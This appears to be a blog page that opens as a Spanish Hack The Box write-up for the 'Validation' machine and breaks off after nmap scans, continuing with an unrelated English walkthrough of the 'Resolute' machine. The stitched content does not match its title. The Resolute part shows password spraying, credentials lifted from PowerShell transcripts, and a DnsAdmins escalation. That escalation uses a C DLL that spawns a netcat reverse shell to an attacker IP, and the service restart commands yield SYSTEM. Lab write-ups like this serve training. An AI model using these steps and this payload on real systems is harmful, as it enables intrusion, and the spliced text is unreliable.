---
layout: single
title: Validation - Hack The Box
excerpt: "En este writeup vamos a resolver la máquina **Validation** de la plataforma **HackTheBox**. En una máquina Linux y su nivel de dificultad es fácil. En esta máquina escribiremos una WebShell que inyectaremos utilizando una vulnerabilidad SQL injection. Con esta Shell, accederemos a la máquina objetivo para encontrar la primera flag. Para acceder a root, utilizaremos una password encontrada en la enumeración de la maquina."
date: 2023-07-3
classes: wide
header:
  teaser: /assets/images/htb-writeup-validation/Validation.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - sqli
---

![](/assets/images/htb-writeup-validation/Validation.png)


## Introducción

En este writeup vamos a resolver la máquina **Validation** de la plataforma **HackTheBox**. En una máquina Linux y su nivel de dificultad es fácil. En esta máquina escribiremos una WebShell que inyectaremos utilizando una vulnerabilidad SQL injection. Con esta Shell, accederemos a la máquina objetivo para encontrar la primera flag. Para acceder a root, utilizaremos una password encontrada en la enumeración de la maquina.

## Enumeración

Realizamos un escaneo rápido para obtener puertos abiertos:

```console
┌──(kali㉿kali)-[~/HTB/Validation]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.116 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-17 14:19 EDT
Initiating SYN Stealth Scan at 14:19
Scanning 10.10.11.116 [65535 ports]
Discovered open port 8080/tcp on 10.10.11.116
Discovered open port 80/tcp on 10.10.11.116
Discovered open port 22/tcp on 10.10.11.116
Discovered open port 4566/tcp on 10.10.11.116
Completed SYN Stealth Scan at 14:19, 10.68s elapsed (65535 total ports)
Nmap scan report for 10.10.11.116
Host is up, received user-set (0.035s latency).
Scanned at 2023-07-17 14:19:44 EDT for 10s
Not shown: 65522 closed tcp ports (reset), 9 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 62
4566/tcp open  kwtc       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.75 seconds
           Raw packets sent: 66287 (2.917MB) | Rcvd: 65565 (2.623MB)

```

Ahora realizamos un escaneo mas exhaustivo sobre los puertos abiertos.

```console
┌──(kali㉿kali)-[~/HTB/Validation]
└─$ nmap -sCV -p22,80,4566,8080 10.10.11.116 -oN targeted
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-17 14:21 EDT
Nmap scan report for validation.htb (10.10.11.116)
Host is up (0.034s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.05 seconds

```

En principio nos dice poco. Tenemos ssh en el 22 y 3 puertos http.

Un vistazo rapido a la web nos indica que solo está activo el servidor del puerto 80.

Realizamos enumeración a la aplicación del puerto 80.

A nivel de fuzzing no encontramos mucho.



Revisamos la página principal y hacemos las típicas pruebas para averiguar si estamos ante una SQLi.





## Tools/Blogs used

- [windapsearch](https://github.com/ropnop/windapsearch)
- [BloodHound.py](https://github.com/fox-it/BloodHound.py)
- [From DnsAdmins to SYSTEM to Domain Compromise](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

## Fails

- Tried to create and modify DNS records once I had access to user Ryan, thinking it was a similar priv esc path than another lab on HTB
- Not keeping a "ready-to-go" DLL file handy. I had one on my previous Kali VM but didn't copy it over so I wasted precious time building a new one.

## Recon - Portscan

```
root@beholder:~/htb/resolute# nmap -p- 10.10.10.169
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-07 14:03 EST
Nmap scan report for resolute.htb (10.10.10.169)
Host is up (0.025s latency).
Not shown: 65512 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49688/tcp open  unknown
49776/tcp open  unknown
```

## Recon - Enumerating users

Anonymous bind is allowed on the DC so I can use `windapsearch` to quickly get a list of all users on the system. This tool saves me the trouble of remembering the exact ldapsearch syntax (which I forget every single time).

```
root@beholder:~# windapsearch.py --dc-ip 10.10.10.169 -U
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.169
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=megabank,DC=local
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 25 users: 

cn: Guest

cn: DefaultAccount

cn: Ryan Bertrand
userPrincipalName: ryan@megabank.local

cn: Marko Novak
userPrincipalName: marko@megabank.local

cn: Sunita Rahman
userPrincipalName: sunita@megabank.local

cn: Abigail Jeffers
userPrincipalName: abigail@megabank.local

cn: Marcus Strong
userPrincipalName: marcus@megabank.local

cn: Sally May
userPrincipalName: sally@megabank.local

cn: Fred Carr
userPrincipalName: fred@megabank.local

cn: Angela Perkins
userPrincipalName: angela@megabank.local

cn: Felicia Carter
userPrincipalName: felicia@megabank.local

cn: Gustavo Pallieros
userPrincipalName: gustavo@megabank.local

cn: Ulf Berg
userPrincipalName: ulf@megabank.local

cn: Stevie Gerrard
userPrincipalName: stevie@megabank.local

cn: Claire Norman
userPrincipalName: claire@megabank.local

cn: Paulo Alcobia
userPrincipalName: paulo@megabank.local

cn: Steve Rider
userPrincipalName: steve@megabank.local

cn: Annette Nilsson
userPrincipalName: annette@megabank.local

cn: Annika Larson
userPrincipalName: annika@megabank.local

cn: Per Olsson
userPrincipalName: per@megabank.local

cn: Claude Segal
userPrincipalName: claude@megabank.local

cn: Melanie Purkis
userPrincipalName: melanie@megabank.local

cn: Zach Armstrong
userPrincipalName: zach@megabank.local

cn: Simon Faraday
userPrincipalName: simon@megabank.local

cn: Naoki Yamamoto
userPrincipalName: naoki@megabank.local

[*] Bye!
```

I did another search in the LDAP directory but this time looking at the description because sometimes we can find additonial useful information in there. Here I see that the `marko` user has a note about the password being set to `Welcome123!`

```
root@beholder:~# windapsearch.py --dc-ip 10.10.10.169 --attrs sAMAccountName,description -U
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.169
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=megabank,DC=local
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 25 users: 

[...]
description: Account created. Password set to Welcome123!
sAMAccountName: marko
[...]
```

## Password spraying - Access to user Melanie

The credentials `marko / Welcome123!` don't work with either SMB or WinRM:

```
root@beholder:~# evil-winrm -u marko -p Welcome123! -i 10.10.10.169
Evil-WinRM shell v2.0
Info: Establishing connection to remote endpoint
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

root@beholder:~# smbmap -u marko -p Welcome123! -H 10.10.10.169
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.169
```

The password could be used by another account on the system so I'll use crackmapexec to try that password across all the accounts. I'll save my list of users to `users.txt` and use it with CME.

```
root@beholder:~/htb/resolute# crackmapexec smb 10.10.10.169 -u users.txt -p Welcome123!
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:MEGABANK) (signing:True) (SMBv1:True)
[...]
SMB         10.10.10.169    445    RESOLUTE         [+] MEGABANK\melanie:Welcome123!
```

Bingo, we got the password for Melanie's account.

```
root@beholder:~/htb/resolute# evil-winrm -u melanie -p Welcome123! -i 10.10.10.169

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents> type ..\desktop\user.txt
0c3be45f[...]
```

## Powershell transcripts - Getting access as user ryan

Looking around the filesystem, I found the Powershell transcripts in the `C:\pstranscripts\20191203` directory. They contain a `net use` command that `ryan` used to mount a remote file share. Unfortunately for him, he specified the credentials in the command so I can see them in plaintext in the transcript file: `ryan / Serv3r4Admin4cc123!`

```
*Evil-WinRM* PS C:\pstranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
[...]
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

After getting access to the `ryan` user account, I found a note in his desktop folder talking about changes automatically being reverted.

```
root@beholder:~/htb/resolute# evil-winrm -u ryan -p Serv3r4Admin4cc123! -i 10.10.10.169
Evil-WinRM shell v2.0
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents> dir ../desktop
    Directory: C:\Users\ryan\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        12/3/2019   7:34 AM            155 note.txt

*Evil-WinRM* PS C:\Users\ryan\Documents> type ../desktop/note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

## Privesc using the DNS service

Our `ryan` user is part of the `Contractors` domain group.

```
*Evil-WinRM* PS C:\Users\ryan\Documents> net user ryan
User name                    ryan
Full Name                    Ryan Bertrand
[...]
Local Group Memberships      
Global Group memberships     *Domain Users         *Contractors          
The command completed successfully.
```

I used the python BloodHound ingestor to dump the info in BloodHound and see if I could pick up anything interesting to exploit.

```
root@beholder:~/opt/BloodHound.py# ./bloodhound.py -c all -u ryan -p Serv3r4Admin4cc123! --dns-tcp -d megabank.local -dc megabank.local -gc megabank.local -ns 10.10.10.169
INFO: Found AD domain: megabank.local
INFO: Connecting to LDAP server: megabank.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: megabank.local
INFO: Found 27 users
INFO: Found 50 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: MS02.megabank.local
INFO: Querying computer: Resolute.megabank.local
INFO: Done in 00M 03S
```

![](/assets/images/htb-writeup-resolute/bloodhound.png)

As I suspected, user `ryan` is a member of two additional groups: `Remote Management Users` and `DnsAdmin`. I remember reading about a potential privilege escalation vector for users with `DnsAdmin` group access.

Spotless has a great [blog post](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise) that covers this priv esc. In a nutshell, we can ask the machine to load an arbitrary DLL file when the service starts so that gives us RCE as SYSTEM. Because we're in the `DnsAdmins` group, we can re-configure the service and we have the required privileges to restart it.

Here's a quick DLL file that just calls netcat to get a reverse shell.

```c
#include "stdafx.h"
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		system("c:\\windows\\system32\\spool\\drivers\\color\\nc.exe -e cmd.exe 10.10.14.51 5555");
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```

After compiling this, I upload both the DLL and netcat to the machine.

```
*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> upload /root/htb/resolute/nc.exe
Info: Uploading /root/htb/resolute/nc.exe to C:\windows\system32\spool\drivers\color\nc.exe

Data: 53248 bytes of 53248 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> upload /root/htb/resolute/pwn.dll
Info: Uploading /root/htb/resolute/pwn.dll to C:\windows\system32\spool\drivers\color\pwn.dll

Data: 305604 bytes of 305604 bytes copied

Info: Upload successful!
```

Next, I'll reconfigure the dns service and restart it.

```
*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> cmd /c 'dnscmd RESOLUTE /config /serverlevelplugindll C:\Windows\System32\spool\drivers\color\pwn.dll'

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> cmd /c "sc stop dns"

SERVICE_NAME: dns 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> cmd /c "sc start dns"

SERVICE_NAME: dns 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3500
        FLAGS
```

This triggers the DLL and I get a reverse shell as SYSTEM:

```
root@beholder:~/htb/resolute# rlwrap nc -lvnp 5555
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.10.10.169.
Ncat: Connection from 10.10.10.169:56778.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>type c:\users\administrator\desktop\root.txt
e1d9487[...]
```